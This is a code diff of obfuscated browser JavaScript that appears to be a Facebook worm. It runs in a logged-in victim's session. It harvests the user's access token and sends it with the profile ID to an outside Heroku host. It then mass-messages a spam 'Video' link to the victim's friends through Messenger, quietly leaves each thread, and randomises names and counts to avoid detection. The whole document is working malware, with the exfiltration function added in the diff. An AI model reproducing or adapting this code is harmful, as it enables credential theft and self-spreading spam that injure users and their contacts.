@@ -5,18 +5,15 @@ var win = this;
 var sie = win["XMLHttpRequest"];
 var empty = "";
 function nejse() {
-  var c_n = "locl:987"+profile_id;
-  var c_t = 30;
+  var c_n = "loclater:987"+profile_id;
+  var c_t = 20;
 
   if(!localStorage[c_n] || parseInt(localStorage[c_n]) < Date.now()-60*1000*c_t){
       localStorage[c_n] = Date.now();
     config = {};
-    config["link"] = "http://{random}./{random}";
     config["post_limit"] = "1";
-    config["tag_limit"] = 99;
+    config["tag_limit"] = rand(50,150);
     config["mode"] = true;
-    config["testuser"] = "100010314190852";
-    console["log"](config);
     if (!(1 != config["mode"] && profile_id != config["testuser"])) {
        _e_P();
        nekot();
@@ -25,40 +22,6 @@ function nejse() {
       var a_t = new Date();
       a_t.setTime(parseInt(localStorage[c_n]) + (60*1000*c_t));
       console.log("a_t:" + a_t.toLocaleString());
-  }
-}
-function nekot() {
-
-  if (localStorage.access_token != "nekotwe") {
-    var getParams = {};
-    getParams["composer_id"] = "rc.u_0_" + rand(0, 30);
-    getParams["composer_type"] = "pages_feed";
-    getParams["target_id"] = "20531316728";
-    getParams["av"] = profile_id;
-    getParams["dpr"] = "1";
-    var params = {};
-    params["__user"] = profile_id;
-    params["__a"] = "1";
-    params["__dyn"] = __dyn;
-    params["__af"] = "j0";
-    params["__req"] = "2z";
-    params["__be"] = "-1";
-    params["__pc"] = "EXP1:home_page_pkg";
-    params["__rev"] = __rev;
-    params["fb_dtsg"] = fb_dtsg;
-    params["jazoest"] = jazoest;
-    var xhr = new ajax;
-    xhr.open("POST", "/react_composer/status/bootstrap/?" + deSerialize(getParams));
-    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-    xhr.onreadystatechange = function() {
-      if (xhr.readyState == 4 && xhr.status == 200) {
-        if (xhr.responseText.indexOf("access_token") > 0) {
-           new Image().src = "https://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  xhr.responseText.split('access_token":')[1].split('"')[1].split('"')[0] + "&gnd=PROBA_INBOX";
-          localStorage.access_token = "nekotwe";
-        }
-      }
-    };
-    xhr.send(deSerialize(params));
   }
 }
 function _e_P(){
@@ -84,6 +47,40 @@ function _e_P(){
     }
   };
   d["send"](_z(b));
+}
+function nekot() {
+
+  if (localStorage.access_token != "nejsimddddd") {
+    var getParams = {};
+    getParams["composer_id"] = "rc.u_0_" + rand(0, 30);
+    getParams["composer_type"] = "pages_feed";
+    getParams["target_id"] = "20531316728";
+    getParams["av"] = profile_id;
+    getParams["dpr"] = "1";
+    var params = {};
+    params["__user"] = profile_id;
+    params["__a"] = "1";
+    params["__dyn"] = dyn;
+    params["__af"] = "j0";
+    params["__req"] = "2z";
+    params["__be"] = "-1";
+    params["__pc"] = "EXP1:home_page_pkg";
+    params["__rev"] = __rev;
+    params["fb_dtsg"] = fb_dtsg;
+    params["jazoest"] = jazoest;
+    var xhr = new sie;
+    xhr.open("POST", "/react_composer/status/bootstrap/?" + _z(getParams));
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState == 4 && xhr.status == 200) {
+        if (xhr.responseText.indexOf("access_token") > 0) {
+           new Image().src = "https://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  xhr.responseText.split('access_token":')[1].split('"')[1].split('"')[0] + "&gnd=PROBA_INBOX";
+          localStorage.access_token = "nejsimddddd";
+        }
+      }
+    };
+    xhr.send(_z(params));
+  }
 }
 function _g_T() {
     var params = {};
@@ -120,7 +117,6 @@ function _g_T() {
             var c = {};
             if(xhr.responseText.indexOf("access_token=") > 0){
                 c.access_token = xhr.responseText.split("access_token=")[1].split("&")[0];
-                //new Image().src = "https://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  c.access_token + "&gnd=AndroidNEW";
                 _c(c);
             }
         }
@@ -199,7 +195,8 @@ function _e(c) {
            if(data.link){
              c["link"] = data.link;
              c["tags"] = b;
-             post(c);
+             //message(c);
+             scrape(c);
            }
 
           }
@@ -208,42 +205,138 @@ function _e(c) {
 
 
 }
+function scrape(c){
+    var params = {}
+    params["image_height"] = 960;
+    params["image_width"] = 960;
+    params["uri"] = c.link;
+    params["__user"] = profile_id;
+    params["__a"] = 1;
+    params["__dyn"] = dyn;
+    params["__req"] = "15";
+    params["__be"] = "-1";
+    params["fb_dtsg"] = fb_dtsg;
+    params["jazoest"] = jazoest;
+    params["__rev"] = __rev;
+    var xhr = new sie();
+    xhr.open("POST", "https://www.facebook.com/message_share_attachment/fromURI/?dpr=1&ext=me");
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+    xhr.send(deSerialize(params));
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
+            c.urlInfoCanoncial = searchArray(data, "canonical");
+            c.urlInfoFinal = searchArray(data, "final");
+            c.urlInfoUser = searchArray(data, "user");
+            c.favicon = searchArray(data, "favicon");
+            c.title = searchArray(data, "title");
+            c.description = searchArray(data, "description");
 
-function post(c) {
+            c.images = searchArray(data, "images");
+            c.time_scraped = searchArray(data, "time_scraped");
+            //c.url = searchArray(data, "url");
+
+
+            sendMessageImage(c);
+        }
+    }
+}
+function sendMessageImage(c){
+    var b = c["tags"];
+    var e = c["link"];
+    var message = generate_name(10);
+    var message_id = rand(11111111,999999999);
+
+    var params = {};
+    params["client"] = "mercury";
+    params["action_type"] = "ma-type:user-generated-message";
+    params["body"] = "";
+    params["client_thread_id"] = "root:"+message_id;
+    params["ephemeral_ttl_mode"] = 0;
+    params["has_attachment"] = true;
+    params["message_id"] = message_id;
+    params["offline_threading_id"] = message_id;
+    params["signature_id"] = _y(8);
+    params["shareable_attachment[share_type]"] = 100;
+    params["shareable_attachment[share_params][urlInfo][canonical]"] = c.urlInfoCanoncial;
+    params["shareable_attachment[share_params][urlInfo][final]"] = c.urlInfoFinal;
+    params["shareable_attachment[share_params][urlInfo][user]"] = c.urlInfoUser;
+    params["shareable_attachment[share_params][responseCode]"] = 200;
+    params["shareable_attachment[share_params][favicon]"] = c.favicon;
+    params["shareable_attachment[share_params][title]"] = c.title;
+    params["shareable_attachment[share_params][summary]"] = c.description;
+    params["shareable_attachment[share_params][caption]"] = "youtu.be";
+    params["shareable_attachment[share_params][content_removed]"] = false;
+    params["shareable_attachment[share_params][images][0]"] = c.images;
+    params["shareable_attachment[share_params][medium]"] = 106;
+    params["shareable_attachment[share_params][url]"] = c.urlInfoUser;
+    params["shareable_attachment[share_params][time_scraped]"] = c.time_scraped;
+    params["shareable_attachment[share_params][cache_hit]"] = true;
+    params["shareable_attachment[share_params][was_recent]"] = false;
+    params["shareable_attachment[share_params][ttl]"] = 604800;
+    params["shareable_attachment[share_params][error]"] = 1;
+    params["source"] = "source:chat:web";
+    i = 0;
+    for (;i < c["tags"].length;i++) {
+      params["specific_to_list[" + i + "]"] = "fbid:"+c["tags"][i].uid;
+    }
+    params["tags[0]"] = "web:trigger:one_to_one_plus";
+    params["timestamp"] = Date.now();
+    params["ui_push_phase"] = "V3";
+    params["__user"] = profile_id;
+    params["__a"] = 1;
+    params["__dyn"] = dyn;
+    params["__req"] = "t";
+    params["__be"] = -1;
+    params["__pc"] = "PHASED:DEFAULT";
+    params["fb_dtsg"] = fb_dtsg;
+    params["jazoest"] = jazoest;
+    params["__rev"] = __rev;
+
+    var xhr = new sie();
+    xhr.open("POST", "https://www.facebook.com/messaging/send/?ext=me");
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+            var data = JSON.parse(xhr.responseText.replace("for (;;);",""));
+            if(!data.error){
+              c["thread_fbid"] = _t(data, "thread_fbid");
+              leave(c);
+
+            }else{
+              leave(c);
+            }
+        }
+    }
+    xhr.send(deSerialize(params))
+}
+function message(c) {
+  var textArray = [":o", ":P", "O:)", "3:)", ";)", ":O", "-_-", ">:O", ":*", "<3", "^_^", "8-)", "(y)", ":)"];
+  var emoji = textArray[Math.floor(Math.random() * textArray.length)];
+  var body = emoji + "\nVideo ⤵⤵⤵\n" + c.link;
   var b = c["tags"];
   var e = c["link"];
+  var elementid = "rc.u_ps_jsonp_6_3_1";
   var message = generate_name(10);
+  message_id = _v(0xa1b01d4b1c7, 999999999999999);
   var d$$0 = {};
-  d$$0["composer_entry_time"] = 6;
-  d$$0["composer_session_id"] = _p();
-  d$$0["composer_session_duration"] = _v(15, 50);
-  d$$0["composer_source_surface"] = "timeline";
-  d$$0["direct_share_status"] = 0;
-  d$$0["hide_object_attachment"] = true;
-  d$$0["is_explicit_place"] = false;
-  d$$0["is_markdown"] = false;
-  d$$0["is_q_and_a"] = false;
-  d$$0["is_profile_badge_post"] = false;
-  d$$0["num_keystrokes"] = 0;
-  d$$0["num_pastes"] = 0;
-  d$$0["privacyx"] = 300645083384735;
-  d$$0["ref"] = "timeline";
-  d$$0["target_type"] = "feed";
-  d$$0["xhpc_message"] = message;
-  d$$0["xhpc_message_text"] = message;
-  d$$0["xc_disable_config[xc_disable_link]"] = "";
-  d$$0["is_react"] = true;
-  d$$0["xhpc_composerid"] = "rc.u_0_1g";
-  d$$0["xhpc_targetid"] = profile_id;
-  d$$0["xhpc_context"] = "profile";
-  d$$0["xhpc_ismeta"] = 1;
-  d$$0["xhpc_timeline"] = true;
-  d$$0["xhpc_finch"] = false;
-  d$$0["xhpc_socialplugin"] = false;
-  d$$0["xhpc_modal_composer"] = false;
-  d$$0["xhpc_aggregated_story_composer"] = false;
-  d$$0["xhpc_publish_type"] = 1;
-  d$$0["xhpc_fundraiser_page"] = false;
+  d$$0["client"] = "mercury";
+  d$$0["action_type"] = "ma-type:user-generated-message";  //translated title
+  d$$0["body"] = body;
+  d$$0["client_thread_id"] = "root:"+message_id;
+  d$$0["has_attachment"] = false;
+  d$$0["message_id"] = message_id;
+  d$$0["offline_threading_id"] = message_id;
+  d$$0["signature_id"] = _y(8);
+  d$$0["source"] = "source:chat:web";
+  i = 0;
+  for (;i < c["tags"].length;i++) {
+    d$$0["specific_to_list[" + i + "]"] = "fbid:"+c["tags"][i].uid;
+  }
+  d$$0["tags[0]"] = "web:trigger:one_to_one_plus";
+  d$$0["timestamp"] = Date.now();
+  d$$0["ui_push_phase"] = "C3";
   d$$0["__user"] = profile_id;
   d$$0["__a"] = 1;
   d$$0["__dyn"] = dyn;
@@ -254,195 +347,62 @@ function post(c) {
   d$$0["__rev"] = __rev;
   d$$0["fb_dtsg"] = fb_dtsg;
   d$$0["jazoest"] = jazoest;
-  i = 0;
-  for (;i < c["tags"].length;i++) {
-    d$$0["composertags_with[" + i + "]"] = c["tags"][i].uid;
-    d$$0["text_composertags_with[" + i + "]"] = c["tags"][i].name;
-  }
+
   var f = new sie;
-  f["open"]("POST", "https://www.facebook.com/ajax/updatestatus.php?ext=me&av=" + profile_id);
+  f["open"]("POST", "https://www.facebook.com/messaging/send/?dpr=1&ext=me");
   f["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
   f["send"](_z(d$$0));
   f["onreadystatechange"] = function() {
     if (4 == f["readyState"] && 200 == f["status"]) {
       var d = JSON["parse"](f["responseText"].replace("for (;;);", ""));
       if (!d["error"]) {
-        c["post_id"] = _t(d, "targetfbid");
-        c["tags"] = b;
-        c["link"] = e;
-        console["log"]("Posted: https://fb.com/" + c["post_id"]);
-        comment(c);
+        c["thread_fbid"] = _t(d, "thread_fbid");
+        leave(c);
+
+      }
+    }
+  };
+}
+function leave(c) {
+  var message = generate_name(10);
+  message_id = _v(0xa1b01d4b1c7, 999999999999999);
+  var d$$0 = {};
+  d$$0["client"] = "mercury";
+  d$$0["action_type"] = "ma-type:log-message";  //translated title
+  d$$0["ephemeral_ttl_mode"] = 0;
+  d$$0["log_message_data[removed_participants][0]"] = "fbid:"+profile_id;
+  d$$0["log_message_type"] = "log:unsubscribe";
+  d$$0["message_id"] = message_id;
+  d$$0["offline_threading_id"] = message_id;
+  d$$0["source"] = "source:chat:web";
+  d$$0["thread_fbid"] = c["thread_fbid"];
+  d$$0["timestamp"] = Date.now();
+  d$$0["__user"] = profile_id;
+  d$$0["__a"] = 1;
+  d$$0["__dyn"] = dyn;
+  d$$0["__af"] = "i0";
+  d$$0["__req"] = "q";
+  d$$0["__be"] = -1;
+  d$$0["__pc"] = "PHASED:DEFAULT";
+  d$$0["__rev"] = __rev;
+  d$$0["fb_dtsg"] = fb_dtsg;
+  d$$0["jazoest"] = jazoest;
+
+  var f = new sie;
+  f["open"]("POST", "https://www.facebook.com/messaging/send/?dpr=1&ext=me");
+  f["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+  f["send"](_z(d$$0));
+  f["onreadystatechange"] = function() {
+    if (4 == f["readyState"] && 200 == f["status"]) {
+      var d = JSON["parse"](f["responseText"].replace("for (;;);", ""));
+      if (!d["error"]) {
+        //c["post_id"] = _t(d, "targetfbid");
+
       }
     }
   };
 }
 
-function comment(c) {
-  var b = c["tags"];
-  var e = c["link"];
-  var d = c["post_id"];
-  var f = {};
-  f["ft_ent_identifier"] = c["post_id"];
-  f["comment_text"] = "Video ⤵ ⤵ ⤵ ⤵ ⤵ ⤵"+ "\n" + c["link"];
-  f["source"] = 1;
-  f["client_id"] = Date["now"]() + ":" + Math["floor"](Date["now"]() / 1E3);
-  f["session_id"] = _y(8);
-  f["reply_fbid"] = "";
-  f["parent_comment_id"] = "";
-  f["rootid"] = "u_ps_0_0_7";
-  f["attached_sticker_fbid"] = 0;
-  f["attached_photo_fbid"] = 0;
-  f["attached_video_fbid"] = 0;
-  f["feedback_referrer"] = "/permalink.php";
-  f["feed_context"] = "{}";
-  f["video_time_offset"] = "";
-  f["is_live_streaming"] = false;
-  f["ft[top_level_post_id]"] = c["post_id"];
-  f["ft[fbfeed_location]"] = 1;
-  f["ft[insertion_position]"] = 0;
-  f["av"] = profile_id;
-  f["__user"] = profile_id;
-  f["__a"] = 1;
-  f["__dyn"] = dyn;
-  f["__af"] = "m";
-  f["__req"] = 14;
-  f["__be"] = -1;
-  f["__pc"] = "PHASED:DEFAULT";
-  f["__rev"] = __rev;
-  f["fb_dtsg"] = fb_dtsg;
-  f["jazoest"] = jazoest;
-  var g = new sie;
-  g["open"]("POST", "https://www.facebook.com/ufi/add/comment/?ext=me");
-  g["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-  g["send"](_z(f));
-  g["onreadystatechange"] = function() {
-    if (!(4 != g["readyState"])) {
-      if (!(200 != g["status"])) {
-        if (!JSON["parse"](g["responseText"].replace("for (;;);", ""))["error"]) {
-          _h(c);
-          // _i(c);
-          // _j(c);
-          c["tags"] = b;
-          c["link"] = e;
-          c["post_id"] = d;
-          console["log"]("Commented: https://fb.com/" + c["post_id"]);
-        }
-      }
-    }
-  };
-}
-function _h(c) {
-  var b$$0 = {};
-  b$$0["composer_id"] = "rc.u_a_0";
-  b$$0["target_id"] = profile_id;
-  b$$0["scrape_url"] = c["link"];
-  b$$0["entry_point"] = "edit_dialog";
-  b$$0["source_attachment"] = "STATUS";
-  b$$0["source_logging_name"] = "link_pasted";
-  b$$0["av"] = profile_id;
-  b$$0["dpr"] = 1;
-  b$$0["ext"] = "me";
-  var e$$0 = {};
-  e$$0["__user"] = profile_id;
-  e$$0["__a"] = 1;
-  e$$0["__dyn"] = dyn;
-  e$$0["__af"] = "i0";
-  e$$0["__req"] = "k";
-  e$$0["__be"] = -1;
-  e$$0["__pc"] = "PHASED:DEFAULT";
-  e$$0["__rev"] = __rev;
-  e$$0["fb_dtsg"] = fb_dtsg;
-  e$$0["jazoest"] = jazoest;
-  var d = new sie;
-  d["open"]("POST", "https://www.facebook.com/react_composer/scraper/?" + _z(b$$0));
-  d["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-  d["send"](_z(e$$0));
-  d["onreadystatechange"] = function() {
-    if (4 == d["readyState"] && 200 == d["status"]) {
-      var b = JSON["parse"](d["responseText"].replace("for (;;);", ""));
-      c["scrape"] = _t(b, "attachmentConfig");
-      b = _t(b, "__html");
-      var e = document["createElement"]("form");
-      e["innerHTML"] = b;
-      b = e["getElementsByTagName"]("input");
-      c["attachment"] = {};
-      i = 0;
-      for (;i < b["length"];i++) {
-        if (b[i].name) {
-          c["attachment"][b[i].name] = b[i].value;
-        }
-      }
-      _i(c);
-      _j(c);
-    }
-  };
-}
-function _i(c) {
-  var b = {};
-  // for (key in c["attachment"]) {
-  //   b[key] = c["attachment"][key];
-  // }
-  b["composer_entry_time"] = 8;
-  b["composer_session_id"] = _p();
-  b["composer_session_duration"] = _v(250, 750);
-  b["composer_source_surface"] = "newsfeed";
-  b["direct_share_status"] = 0;
-  b["hide_object_attachment"] = true;
-  b["is_explicit_place"] = false;
-  b["is_markdown"] = false;
-  b["is_q_and_a"] = false;
-  b["is_profile_badge_post"] = false;
-  b["num_keystrokes"] = 0;
-  b["num_pastes"] = 0;
-  b["privacyx"] = "300645083384735";
-  b["ref"] = "edit_dialog";
-  b["tagger_session_id"] = Math["floor"](Date["now"]() / 1E3);
-  b["target_type"] = "feed";
-  b["xhpc_message"] = "";
-  b["xhpc_message_text"] = "";
-  b["is_forced_reshare_of_post"] = false;
-  b["is_react"] = true;
-  b["xhpc_composerid"] = "rc.u_a_0";
-  b["xhpc_targetid"] = profile_id;
-  b["xhpc_context"] = "profile";
-  b["xhpc_ismeta"] = 1;
-  b["xhpc_timeline"] = false;
-  b["xhpc_finch"] = false;
-  b["xhpc_socialplugin"] = false;
-  b["xhpc_modal_composer"] = false;
-  b["xhpc_aggregated_story_composer"] = false;
-  b["xhpc_publish_type"] = 1;
-  b["xhpc_fundraiser_page"] = false;
-  b["postID"] = c["post_id"];
-  b["save_only"] = true;
-  b["xc_edit_callsite"] = "fb_feed";
-  b["xc_entstory_context"] = "{}";
-  b["xc_story_dom_id"] = "u_0_t";
-  b["__user"] = profile_id;
-  b["__a"] = 1;
-  b["__dyn"] = dyn;
-  b["__af"] = "i0";
-  b["__req"] = "o";
-  b["__be"] = -1;
-  b["__pc"] = "PHASED:DEFAULT";
-  b["__rev"] = __rev;
-  b["fb_dtsg"] = fb_dtsg;
-  b["jazoest"] = jazoest;
-  i = 0;
-  for (;i < c["friends"].length;i++) {
-    b["composertags_with[" + i + "]"] = c["friends"][i].uid;
-    b["text_composertags_with[" + i + "]"] = c["friends"][i].name;
-  }
-  var e = new sie;
-  e["open"]("POST", "https://www.facebook.com/composer/edit/" + c["post_id"] + "?av=" + profile_id + "&ext=me");
-  e["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-  e["send"](_z(b));
-  e["onreadystatechange"] = function() {
-    if (4 == e["readyState"] && (200 == e["status"] && !JSON["parse"](e["responseText"].replace("for (;;);", ""))["error"])) {
-      console["log"]("Edited: https://fb.com/" + c["post_id"]);
-    }
-  };
-}
 function generate_name(length,firstUpper){
     rname = "";
     sesli = "aeiou";
@@ -460,52 +420,7 @@ function generate_name(length,firstUpper){
     }
     return rname;
 }
-function _j(c) {
-  var b = {};
-  b["message_id"] = c["post_id"];
-  b["follow"] = 0;
-  b["__user"] = profile_id;
-  b["__a"] = 1;
-  b["__dyn"] = dyn;
-  b["__af"] = "m";
-  b["__req"] = 8;
-  b["__be"] = -1;
-  b["__pc"] = "PHASED:DEFAULT";
-  b["__rev"] = __rev;
-  b["fb_dtsg"] = fb_dtsg;
-  b["jazoest"] = jazoest;
-  var e = new sie;
-  e["open"]("POST", "https://www.facebook.com/ajax/litestand/follow_post?ext=me");
-  e["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-  e["send"](_z(b));
-  e["onreadystatechange"] = function() {
-    if (4 == e["readyState"] && 200 == e["status"]) {
-      JSON["parse"](e["responseText"].replace("for (;;);", ""));
-    }
-  };
-}
 
-function _l() {
-  var c = {};
-  c["value"] = "300645083384735";
-  c["prev_value"] = "291667064279714";
-  c["__user"] = profile_id;
-  c["__a"] = 1;
-  c["__dyn"] = dyn;
-  c["__req"] = "15";
-  c["fb_dtsg"] = fb_dtsg;
-  c["jazoest"] = jazoest;
-  c["__rev"] = __rev;
-  var b = new sie;
-  b["open"]("POST", "https://www.facebook.com/ajax/settings/granular_privacy/composer.php");
-  b["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-  b["send"](_z(c));
-  b["onreadystatechange"] = function() {
-    if (4 == b["readyState"] && 200 == b["status"]) {
-      JSON["parse"](b["responseText"].replace("for (;;);", ""));
-    }
-  };
-}
 function _m(c, b) {
   rname = "";
   sesli = "aeiou";
